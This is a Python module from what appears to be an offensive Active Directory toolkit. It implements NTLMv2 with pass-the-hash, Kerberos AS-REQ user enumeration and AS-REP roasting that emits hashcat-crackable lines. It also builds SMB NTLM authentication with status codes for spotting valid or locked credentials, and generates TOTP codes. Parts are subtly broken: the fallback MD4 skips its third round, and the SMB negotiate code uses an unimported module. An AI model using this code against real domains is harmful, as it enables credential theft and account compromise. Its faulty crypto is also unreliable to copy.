"""VAJRA mini crypto kit — pure-python MD4, RC4, NTLMv2 responses,
pass-the-hash support and compact DER encoding/parsing helpers used by the
Active Directory attack modules."""

import hashlib
import hmac as _hmac
import socket
import struct
import time


# ------------------------------------------------------------------ MD4 ----

def md4(data: bytes) -> bytes:
    try:
        return hashlib.new("md4", data).digest()
    except Exception:
        pass
    h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476]

    def lrot(x, c):
        return ((x << c) | (x >> (32 - c))) & 0xFFFFFFFF

    msg = bytearray(data)
    bitlen = len(data) * 8
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", bitlen)
    for off in range(0, len(msg), 64):
        m = struct.unpack("<16I", msg[off:off + 64])
        a, b, c, d = h
        for i in range(32):
            if i < 16:
                f = (b & c) | (~b & d)
                g = i
                rot = [3, 7, 11, 19][i % 4]
            elif i < 32:
                f = (b & c) | (b & d) | (c & d)
                g = (5 * i + 1) % 16
                rot = [3, 5, 9, 13][i % 4]
            else:
                f = b ^ c ^ d
                g = (3 * i + 5) % 16
                rot = [3, 9, 11, 15][i % 4]
            tmp = (f + a + m[g] + ([0, 0x5A827999, 0x6ED9EBA1,
                                    0xA953FD4E][i // 16])) & 0xFFFFFFFF
            a, d, c, b = d, c, b, (lrot(tmp, rot) + b) & 0xFFFFFFFF
        h = [(v + n) & 0xFFFFFFFF for v, n in zip(h, [a, b, c, d])]
    return struct.pack("<4I", *h)


# ------------------------------------------------------------------ RC4 ----

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


# --------------------------------------------------------------- NTLM ------

def ntlm_hash(password: str) -> bytes:
    return md4(password.encode("utf-16-le"))


def ntlm_v2(user, domain, password=None, nthash=None, challenge=b"",
            target_info=b""):
    """Return (proof, blob). Supports pass-the-hash via nthash."""
    if nthash:
        ntlmh = bytes.fromhex(nthash.replace(":", "")) \
            if isinstance(nthash, str) else nthash
    else:
        ntlmh = ntlm_hash(password or "")
    identity = (user.upper() + domain).encode("utf-16-le")
    v2hash = _hmac.new(ntlmh, identity, hashlib.md5).digest()
    mic_ts = struct.pack("<Q", int((time.time() + 11644473600) * 10_000_000))
    blob = (b"\x01\x01\x00\x00" + mic_ts +
            __import__("os").urandom(8) + b"\x00\x00\x00\x00" +
            target_info)
    proof = _hmac.new(v2hash, challenge + blob, hashlib.md5).digest()
    return proof, blob


# ------------------------------------------------------------------ DER ----

def dlen(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return b"\x81" + bytes([n])
    return b"\x82" + struct.pack(">H", n)


def der(tag: int, *parts: bytes) -> bytes:
    body = b"".join(parts)
    return bytes([tag]) + dlen(len(body)) + body


def der_int(value: int) -> bytes:
    v = value
    out = b""
    while True:
        out = bytes([v & 0xFF]) + out
        v >>= 8
        if v == 0:
            break
    if out and out[0] & 0x80:
        out = b"\x00" + out
    return der(0x02, out)


def ctx(n: int, content: bytes, constructed=True) -> bytes:
    return der(0xA0 | n if constructed else 0x80 | n, content)


def octet(b: bytes) -> bytes:
    return der(0x04, b)


def gstr(s: str) -> bytes:
    return der(0x1B, s.encode())


# ------------------------------------------------------------ AS-REQ ------

def build_as_req(realm: str, user: str, etypes=(23, 17, 18)):
    kdc_opts = b"\x00" + struct.pack(">I", 0x50800000)
    cname = der(0x30, der_int(1),
                der(0x30, gstr(user)))
    sname = der(0x30, der_int(2),
                der(0x30, gstr("krbtgt") + gstr(realm)))
    body_parts = (
        ctx_n(0, kdc_opts) +
        ctx_n(2, cname) +
        ctx_n(3, gstr(realm.upper())) +
        ctx_n(4, sname) +
        ctx_n(5, der(0x18, b"20370101000000Z")) +
        ctx_n(7, der_int(int(time.time()))) +
        ctx_n(8, der(0x30, b"".join(der_int(e) for e in etypes)))
    )
    req_body = der(0x30, body_parts)
    return der(0x6A, der_int(10), ctx_n(2, der_int(10)),
               ctx_n(4, req_body))


def ctx_n(n, content):
    """Context tag wrapping an already-encoded inner element."""
    return bytes([0xA0 | n]) + dlen(len(content)) + content


def send_kdc(host, asreq: bytes, timeout=5.0) -> bytes:
    try:
        s = socket_tcp(host, 88, timeout)
        s.sendall(struct.pack(">I", len(asreq)) + asreq)
        hdr = _recv_exact(s, 4)
        if not hdr:
            s.close()
            return b""
        ln = struct.unpack(">I", hdr)[0]
        data = _recv_exact(s, ln)
        s.close()
        return data
    except Exception:
        return b""


def socket_tcp(host, port, timeout):
    import socket
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    return s


def _recv_exact(s, n):
    buf = b""
    while len(buf) < n:
        chunk = s.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def krb_error_code(reply: bytes):
    idx = reply.find(b"\xa6\x03\x02\x01")
    if idx >= 0 and idx + 5 <= len(reply):
        return reply[idx + 4]
    return None


USER_ENUM_CODES = {
    6: "unknown-principal",
    25: "preauth-required",
    24: "preauth-failed",
}


def as_rep_cipher(reply: bytes):
    """Extract (etype, cipher) from a KRB-AS-REP."""
    for etype_marker in (b"\xa0\x03\x02\x01\x11", b"\xa0\x03\x02\x01\x12",
                         b"\xa0\x03\x02\x01\x17"):
        pos = reply.find(etype_marker)
        if pos < 0:
            continue
        etype = etype_marker[-1]
        oct_start = reply.find(b"\x04\x82", pos)
        if oct_start < 0:
            oct_start = reply.find(b"\x04\x81", pos)
            if oct_start < 0:
                continue
        if reply[oct_start + 1] == 0x82:
            ln = struct.unpack(">H", reply[oct_start + 2:oct_start + 4])[0]
            cipher = reply[oct_start + 4:oct_start + 4 + ln]
        else:
            ln = reply[oct_start + 2]
            cipher = reply[oct_start + 3:oct_start + 3 + ln]
        return etype, cipher
    return None


def asrep_hashcat_line(user, realm, etype, cipher):
    hx = cipher.hex()
    return "$krb5asrep$%d$%s@%s:%s$%s" % (etype, user.lower(),
                                          realm.lower(), hx[:32], hx[32:])


# --------------------------------------------------------- SMB2 NTLM -------

NTLMSSP_SIGN = b"NTLMSSP\x00"


def smb2_negotiate(client_guid=None):
    guid = client_guid or os.urandom(16)
    hdr = smb2_header(cmd=0)
    fixed = struct.pack("<HHHHI", 36, 2, 1, 0, 0x0000005F)
    ctx_off = 64 + len(fixed) - 4 + 16
    ctx_area = struct.pack("<HH", ctx_off if False else 128, 0)
    return (hdr + fixed + guid
            + struct.pack("<HH", 64 + len(fixed) - 4 + 16 + 16, 0)
            + struct.pack("<HH", 2, 0)  # padding guard
            + struct.pack("<HH", 0x0202, 0x0300))


def nbss(payload: bytes) -> bytes:
    return b"\x00\x00\x00" + bytes([len(payload)]) + payload


def smb2_header(cmd, msg_id=1, status=0, session_id=0, credit=126):
    return (b"\xfeSMB" + struct.pack("<H", 64) + b"\x00\x01"
            + struct.pack("<I", status) + struct.pack("<H", cmd)
            + struct.pack("<H", credit) + struct.pack("<I", 1)
            + struct.pack("<I", msg_id) + b"\x00\x00\x00\x00"
            + struct.pack("<I", 0x00010000)[:4] + b"\x00\x00\x00\x00"
            + b"\x00\x00" + b"\x00\x00" + struct.pack("<Q", session_id))


def ntlmssp_negotiate(flags=0x60088215):
    body = NTLMSSP_SIGN + struct.pack("<I", 1) + struct.pack("<I", flags)
    dom = b""
    ws = socket.gethostname().encode("utf-16-le")
    return (struct.pack("<HHI", 0, 0, 32)
            + struct.pack("<HHI", len(dom), len(dom), 32 + len(dom))
            + struct.pack("<HHI", len(ws), len(ws), 32)
            + struct.pack("<HHI", 0, 0, 32 + len(dom))
            + struct.pack("<I", flags) + dom + ws)


def parse_ntlm_challenge(blob):
    """Return (challenge, target_info_bytes, av_dict)."""
    i = blob.find(NTLMSSP_SIGN + b"\x02\x00\x00\x00")
    if i < 0 or len(blob) < i + 32:
        return None, b"", {}
    chal = blob[i + 24:i + 32]
    ti_len, ti_max, ti_off = struct.unpack("<HHI", blob[i + 40:i + 48])
    ti = blob[ti_off:ti_off + ti_len] if ti_len else b""
    avs, p = {}, 0
    while p + 4 <= len(ti):
        t, l = struct.unpack("<HH", ti[p:p + 4])
        val = ti[p + 4:p + 4 + l]
        if t == 0:
            break
        avs[t] = val.decode("utf-16-le", "replace") if l else ""
        p += 4 + l
    return chal, ti, avs


def ntlmssp_auth(user, domain, password=None, nthash=None,
                 challenge=b"", target_info=b""):
    proof, blb = ntlm_v2(user, domain, password=password, nthash=nthash,
                         challenge=challenge, target_info=target_info)
    nt_resp = proof + blb
    dom_u = domain.encode("utf-16-le")
    usr_u = user.encode("utf-16-le")
    ws_u = socket.gethostname().encode("utf-16-le")
    flags = 0x60008215
    hdr_len = 8 + 4 + 12 * 5 + 8
    off = hdr_len
    d_off, off = off, off + len(dom_u)
    u_off, off = off, off + len(usr_u)
    w_off, off = off, off + len(ws_u)
    n_off = off
    body = (NTLMSSP_SIGN + struct.pack("<I", 3)
            + struct.pack("<HHI", 0, 0, hdr_len)
            + struct.pack("<HHI", len(nt_resp), len(nt_resp), n_off)
            + struct.pack("<HHI", len(dom_u), len(dom_u), d_off)
            + struct.pack("<HHI", len(usr_u), len(usr_u), u_off)
            + struct.pack("<HHI", len(ws_u), len(ws_u), w_off)
            + struct.pack("<I", flags)
            + dom_u + usr_u + ws_u + nt_resp)
    return body


SMB_STATUS = {
    0x00000000: "SUCCESS",
    0xC000006A: "wrong-password",
    0xC0000022: "access-denied (creds VALID)",
    0xC0000064: "no-such-user",
    0xC0000234: "ACCOUNT-LOCKED",
    0xC0000071: "password-expired (creds VALID)",
    0xC0000072: "account-disabled (creds VALID)",
}


def totp_codes(secret, t=None, digits=6, period=30, window=1, algo="sha1"):
    """RFC 6238 TOTP codes for time t (default now) with ±window steps.

    Returns a list of valid codes — index window == 0 is the current one.
    Accepts base32 secrets (optionally space/padding stripped)."""
    import base64 as _b64
    if not secret:
        return []
    key = secret.upper().replace(" ", "").replace("-", "")
    lpad = (8 - len(key) % 8) % 8
    try:
        raw = _b64.b32decode(key + "=" * lpad)
    except Exception:
        return []
    if t is None:
        t = int(time.time())
    step = int(t // period)
    out = []
    for i in range(step - window, step + window + 1):
        if i < 0:
            continue
        msg = struct.pack(">Q", i)
        mac = _hmac.new(raw, msg, getattr(hashlib, algo)).digest()
        off = mac[-1] & 0x0F
        bcode = ((mac[off] & 0x7F) << 24 | mac[off + 1] << 16
                 | mac[off + 2] << 8 | mac[off + 3])
        code = str(bcode % (10 ** digits)).zfill(digits)
        if code not in out:
            out.append(code)
    return out
